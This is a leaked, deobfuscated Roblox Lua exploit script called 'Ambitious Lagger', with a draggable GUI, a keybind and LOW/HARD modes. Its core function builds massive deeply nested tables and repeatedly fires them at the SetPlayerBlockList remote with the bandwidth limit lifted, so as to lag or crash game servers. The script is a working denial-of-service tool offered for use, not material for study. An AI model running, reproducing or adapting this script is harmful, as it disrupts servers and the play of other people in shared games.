-- deobf by prince https://discord.gg/TBBAUZu8cW

--[[
	Ambitious Lagger
]]

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local ContentProvider = game:GetService("ContentProvider")

local player = Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")

pcall(function()
	local old = PlayerGui:FindFirstChild("AmbitiousLagger")
	if old then old:Destroy() end
end)

local ConfigFile = "ambitious_lagger.json"
local keybind = Enum.KeyCode.V
local mode = "HARD" -- or "LOW"
local active = false

local MAIN_CONFIG = {
	TableIncrease = 265,
	Tries = 1,
	LoopWaitTime = 0.85,
}
local LOWEND_CONFIG = {
	TableIncrease = 1.5,
	Tries = 1,
	LoopWaitTime = 0.155,
}
local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"

pcall(function()
	if type(isfile) == "function" and isfile(ConfigFile) then
		local data = HttpService:JSONDecode(readfile(ConfigFile))
		if data.Keybind then keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.V end
		if data.Mode then mode = data.Mode end
	end
end)

local function saveConfig()
	if type(writefile) ~= "function" then return end
	pcall(function()
		writefile(ConfigFile, HttpService:JSONEncode({
			Keybind = keybind.Name,
			Mode = mode,
		}))
	end)
end

local function resolveRemote(path)
	local obj = game
	local cleaned = path:gsub("^game%.", "")
	for segment in cleaned:gmatch("[^%.]+") do
		if obj then obj = obj[segment] else return nil end
	end
	return obj
end

local function getmaxvalue(val, isMain)
	if isMain then
		return 499999 / (val + 2)
	else
		return 58500 / (val + 2)
	end
end

local function bomb(tableincrease, tries, isMain)
	local maintable = {}
	local spammedtable = {}
	table.insert(spammedtable, {})
	local z = spammedtable[1]
	for i = 1, tableincrease do
		local tableins = {}
		table.insert(z, tableins)
		z = tableins
	end
	local maximum = getmaxvalue(tableincrease, isMain) or 9999999
	for i = 1, maximum do
		table.insert(maintable, spammedtable)
		if i % 5000 == 0 then task.wait() end
	end
	local remote = resolveRemote(CUSTOM_REMOTE_PATH)
	if remote then
		for i = 1, tries do
			pcall(function()
				if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
					remote:FireServer(maintable)
				elseif remote:IsA("RemoteFunction") then
					remote:InvokeServer(maintable)
				end
			end)
		end
	end
end

local lagThread = nil
local function stopLag()
	if lagThread then
		task.cancel(lagThread)
		lagThread = nil
	end
end

local function startLag()
	stopLag()
	if not active then return end
	local cfg = (mode == "HARD") and MAIN_CONFIG or LOWEND_CONFIG
	local isMain = (mode == "HARD")
	lagThread = task.spawn(function()
		while active do
			pcall(function()
				game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
			end)
			task.spawn(function()
				bomb(cfg.TableIncrease, cfg.Tries, isMain)
			end)
			task.wait(cfg.LoopWaitTime)
		end
	end)
end

-- UI
local Frame_Gui = Instance.new("ScreenGui")
Frame_Gui.Name = "AmbitiousLagger"
Frame_Gui.DisplayOrder = 0
Frame_Gui.Enabled = true
Frame_Gui.IgnoreGuiInset = false
Frame_Gui.ResetOnSpawn = false
Frame_Gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
Frame_Gui.Parent = PlayerGui

local Frame = Instance.new("Frame")
Frame.Name = "Frame"
Frame.Active = true
Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
Frame.BackgroundTransparency = 0
Frame.BorderSizePixel = 1
Frame.ClipsDescendants = true
Frame.Position = UDim2.new(0.5, -175, 0.5, -130)
Frame.Size = UDim2.new(0, 350, 0, 260)
Frame.Visible = true
Frame.ZIndex = 1
Frame.Parent = Frame_Gui

local UIScale = Instance.new("UIScale")
UIScale.Scale = 0.85
UIScale.Parent = Frame

Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)

-- Background image (anime girl)
local ImageLabel2 = Instance.new("ImageLabel")
ImageLabel2.BackgroundTransparency = 1
ImageLabel2.Size = UDim2.new(1, 0, 1, 0)
ImageLabel2.ZIndex = 1
ImageLabel2.Image = "rbxassetid://102877336629662"
ImageLabel2.ImageColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel2.ImageTransparency = 0
ImageLabel2.ScaleType = Enum.ScaleType.Crop
ImageLabel2.Parent = Frame
Instance.new("UICorner", ImageLabel2).CornerRadius = UDim.new(0, 12)

-- Dark overlay
local Frame2 = Instance.new("Frame")
Frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame2.BackgroundTransparency = 0.45
Frame2.BorderSizePixel = 0
Frame2.Size = UDim2.new(1, 0, 1, 0)
Frame2.ZIndex = 2
Frame2.Parent = Frame
Instance.new("UICorner", Frame2).CornerRadius = UDim.new(0, 12)

-- Content layer
local Frame3 = Instance.new("Frame")
Frame3.BackgroundTransparency = 1
Frame3.Size = UDim2.new(1, 0, 1, 0)
Frame3.ZIndex = 3
Frame3.ClipsDescendants = true
Frame3.Parent = Frame

-- Title logo
local Frame10 = Instance.new("Frame")
Frame10.BackgroundTransparency = 1
Frame10.Size = UDim2.new(1, 0, 0, 45)
Frame10.ZIndex = 5
Frame10.Parent = Frame

local ImageLabel = Instance.new("ImageLabel")
ImageLabel.BackgroundTransparency = 1
ImageLabel.Position = UDim2.new(0.5, -550, 0.5, -125)
ImageLabel.Size = UDim2.new(0, 1100, 0, 270)
ImageLabel.ZIndex = 6
ImageLabel.Image = "rbxassetid://128938872032759"
ImageLabel.ScaleType = Enum.ScaleType.Fit
ImageLabel.Parent = Frame10

-- Minimize
local ImageButton = Instance.new("ImageButton")
ImageButton.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
ImageButton.BackgroundTransparency = 0.3
ImageButton.Position = UDim2.new(0, 8, 0, 17)
ImageButton.Size = UDim2.new(0, 32, 0, 32)
ImageButton.ZIndex = 10
ImageButton.AutoButtonColor = true
ImageButton.Image = ""
ImageButton.Parent = Frame
Instance.new("UICorner", ImageButton).CornerRadius = UDim.new(1, 0)
local strokeMin = Instance.new("UIStroke", ImageButton)
strokeMin.Color = Color3.fromRGB(80, 80, 85)
strokeMin.Thickness = 1

local TextLabel3 = Instance.new("TextLabel")
TextLabel3.BackgroundTransparency = 1
TextLabel3.Size = UDim2.new(1, 0, 1, 0)
TextLabel3.ZIndex = 11
TextLabel3.Font = Enum.Font.Fondamento
TextLabel3.Text = "−"
TextLabel3.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel3.TextSize = 22
TextLabel3.Parent = ImageButton

-- Close
local ImageButton2 = Instance.new("ImageButton")
ImageButton2.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
ImageButton2.BackgroundTransparency = 0.3
ImageButton2.Position = UDim2.new(1, -42, 0, 17)
ImageButton2.Size = UDim2.new(0, 32, 0, 32)
ImageButton2.ZIndex = 10
ImageButton2.AutoButtonColor = true
ImageButton2.Image = ""
ImageButton2.Parent = Frame
Instance.new("UICorner", ImageButton2).CornerRadius = UDim.new(1, 0)
local strokeClose = Instance.new("UIStroke", ImageButton2)
strokeClose.Color = Color3.fromRGB(80, 80, 85)
strokeClose.Thickness = 1

local TextLabel4 = Instance.new("TextLabel")
TextLabel4.BackgroundTransparency = 1
TextLabel4.Size = UDim2.new(1, 0, 1, 0)
TextLabel4.ZIndex = 11
TextLabel4.Font = Enum.Font.Fondamento
TextLabel4.Text = "x"
TextLabel4.TextColor3 = Color3.fromRGB(200, 200, 200)
TextLabel4.TextSize = 20
TextLabel4.Parent = ImageButton2

-- ACTIVATE row
local Frame4 = Instance.new("Frame")
Frame4.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
Frame4.BackgroundTransparency = 0.5
Frame4.Position = UDim2.new(0.5, -155, 0, 65)
Frame4.Size = UDim2.new(0, 310, 0, 55)
Frame4.ZIndex = 7
Frame4.Parent = Frame3
Instance.new("UICorner", Frame4).CornerRadius = UDim.new(0, 12)
local stroke4 = Instance.new("UIStroke", Frame4)
stroke4.Color = Color3.fromRGB(160, 0, 255)
stroke4.Thickness = 1.5
stroke4.Transparency = 0.3

local Frame5 = Instance.new("Frame")
Frame5.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
Frame5.BackgroundTransparency = 0.5
Frame5.Position = UDim2.new(0, 12, 0.5, -16)
Frame5.Size = UDim2.new(0, 32, 0, 32)
Frame5.ZIndex = 8
Frame5.Parent = Frame4
Instance.new("UICorner", Frame5).CornerRadius = UDim.new(1, 0)

local playIcon = Instance.new("TextLabel")
playIcon.BackgroundTransparency = 1
playIcon.Size = UDim2.new(1, 0, 1, 0)
playIcon.ZIndex = 9
playIcon.Font = Enum.Font.Fondamento
playIcon.Text = "▶"
playIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
playIcon.TextSize = 18
playIcon.Parent = Frame5

local ActivateBtn = Instance.new("TextButton")
ActivateBtn.BackgroundTransparency = 1
ActivateBtn.Position = UDim2.new(0, 55, 0, 0)
ActivateBtn.Size = UDim2.new(1, -55, 1, 0)
ActivateBtn.ZIndex = 8
ActivateBtn.Font = Enum.Font.Fondamento
ActivateBtn.Text = "ACTIVATE"
ActivateBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ActivateBtn.TextSize = 17
ActivateBtn.TextXAlignment = Enum.TextXAlignment.Left
ActivateBtn.Parent = Frame4

-- KEYBIND row
local Frame6 = Instance.new("Frame")
Frame6.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
Frame6.BackgroundTransparency = 0.5
Frame6.Position = UDim2.new(0.5, -155, 0, 135)
Frame6.Size = UDim2.new(0, 310, 0, 55)
Frame6.ZIndex = 7
Frame6.Parent = Frame3
Instance.new("UICorner", Frame6).CornerRadius = UDim.new(0, 12)
local stroke6 = Instance.new("UIStroke", Frame6)
stroke6.Color = Color3.fromRGB(0, 0, 0)
stroke6.Thickness = 1

local Frame7 = Instance.new("Frame")
Frame7.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
Frame7.BackgroundTransparency = 0.5
Frame7.Position = UDim2.new(0, 12, 0.5, -16)
Frame7.Size = UDim2.new(0, 32, 0, 32)
Frame7.ZIndex = 8
Frame7.Parent = Frame6
Instance.new("UICorner", Frame7).CornerRadius = UDim.new(1, 0)

local keyIcon = Instance.new("TextLabel")
keyIcon.BackgroundTransparency = 1
keyIcon.Size = UDim2.new(1, 0, 1, 0)
keyIcon.ZIndex = 9
keyIcon.Font = Enum.Font.Fondamento
keyIcon.Text = "▶"
keyIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
keyIcon.TextSize = 18
keyIcon.Parent = Frame7

local KeybindBtn = Instance.new("TextButton")
KeybindBtn.BackgroundTransparency = 1
KeybindBtn.Position = UDim2.new(0, 55, 0, 0)
KeybindBtn.Size = UDim2.new(1, -55, 1, 0)
KeybindBtn.ZIndex = 8
KeybindBtn.Font = Enum.Font.Fondamento
KeybindBtn.Text = "KEY: " .. keybind.Name
KeybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
KeybindBtn.TextSize = 17
KeybindBtn.TextXAlignment = Enum.TextXAlignment.Left
KeybindBtn.Parent = Frame6

-- LOW / HARD toggle
local Frame8 = Instance.new("Frame")
Frame8.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
Frame8.BackgroundTransparency = 0.5
Frame8.ClipsDescendants = true
Frame8.Position = UDim2.new(0.5, -155, 0, 200)
Frame8.Size = UDim2.new(0, 310, 0, 35)
Frame8.ZIndex = 7
Frame8.Parent = Frame3
Instance.new("UICorner", Frame8).CornerRadius = UDim.new(0, 8)
local stroke8 = Instance.new("UIStroke", Frame8)
stroke8.Color = Color3.fromRGB(0, 0, 0)
stroke8.Thickness = 1

local highlight = Instance.new("Frame")
highlight.BackgroundColor3 = Color3.fromRGB(160, 0, 255)
highlight.BackgroundTransparency = 0.15
highlight.Position = UDim2.new(0.5, 0, 0.075, 0)
highlight.Size = UDim2.new(0.5, 0, 0.85, 0)
highlight.ZIndex = 8
highlight.Parent = Frame8
Instance.new("UICorner", highlight).CornerRadius = UDim.new(0, 6)
local hlStroke = Instance.new("UIStroke", highlight)
hlStroke.Color = Color3.fromRGB(160, 0, 255)
hlStroke.Thickness = 2

local LowBtn = Instance.new("TextButton")
LowBtn.BackgroundTransparency = 1
LowBtn.Size = UDim2.new(0.5, 0, 1, 0)
LowBtn.ZIndex = 9
LowBtn.Font = Enum.Font.Fondamento
LowBtn.Text = "LOW"
LowBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
LowBtn.TextSize = 12
LowBtn.Parent = Frame8

local HardBtn = Instance.new("TextButton")
HardBtn.BackgroundTransparency = 1
HardBtn.Position = UDim2.new(0.5, 0, 0, 0)
HardBtn.Size = UDim2.new(0.5, 0, 1, 0)
HardBtn.ZIndex = 9
HardBtn.Font = Enum.Font.Fondamento
HardBtn.Text = "HARD"
HardBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
HardBtn.TextSize = 12
HardBtn.Parent = Frame8

local function updateModeVisual()
	if mode == "HARD" then
		highlight.Position = UDim2.new(0.5, 0, 0.075, 0)
		HardBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
		LowBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	else
		highlight.Position = UDim2.new(0, 0, 0.075, 0)
		LowBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
		HardBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
	end
end
updateModeVisual()

local function updateActivateVisual()
	if active then
		ActivateBtn.Text = "ACTIVATED"
		stroke4.Color = Color3.fromRGB(160, 0, 255)
		stroke4.Transparency = 0
		playIcon.Text = "■"
	else
		ActivateBtn.Text = "ACTIVATE"
		stroke4.Color = Color3.fromRGB(160, 0, 255)
		stroke4.Transparency = 0.3
		playIcon.Text = "▶"
	end
end

-- Interactions
LowBtn.MouseButton1Click:Connect(function()
	mode = "LOW"
	updateModeVisual()
	saveConfig()
	if active then
		stopLag()
		startLag()
	end
end)

HardBtn.MouseButton1Click:Connect(function()
	mode = "HARD"
	updateModeVisual()
	saveConfig()
	if active then
		stopLag()
		startLag()
	end
end)

local function toggleActive()
	active = not active
	updateActivateVisual()
	if active then
		startLag()
	else
		stopLag()
	end
end

ActivateBtn.MouseButton1Click:Connect(toggleActive)

local listening = false
KeybindBtn.MouseButton1Click:Connect(function()
	listening = true
	KeybindBtn.Text = "PRESS KEY..."
end)

UserInputService.InputBegan:Connect(function(input, gp)
	if listening then
		if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode ~= Enum.KeyCode.Unknown then
			keybind = input.KeyCode
			KeybindBtn.Text = "KEY: " .. input.KeyCode.Name
			listening = false
			saveConfig()
		end
		return
	end
	if gp then return end
	if input.KeyCode == keybind then
		toggleActive()
	end
end)

-- Drag
do
	local dragging, start, startPos
	Frame.InputBegan:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			start = inp.Position
			startPos = Frame.Position
			inp.Changed:Connect(function()
				if inp.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	UserInputService.InputChanged:Connect(function(inp)
		if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
			local d = inp.Position - start
			Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
		end
	end)
end

local minimized = false
ImageButton.MouseButton1Click:Connect(function()
	minimized = not minimized
	if minimized then
		Frame.Size = UDim2.new(0, 350, 0, 50)
		Frame3.Visible = false
		Frame10.Visible = false
	else
		Frame.Size = UDim2.new(0, 350, 0, 260)
		Frame3.Visible = true
		Frame10.Visible = true
	end
end)

ImageButton2.MouseButton1Click:Connect(function()
	stopLag()
	Frame_Gui:Destroy()
end)

print("[Ambitious Lagger] Loaded")
print(" LEAKED BY TUFFSINO ONLY AT FPSL")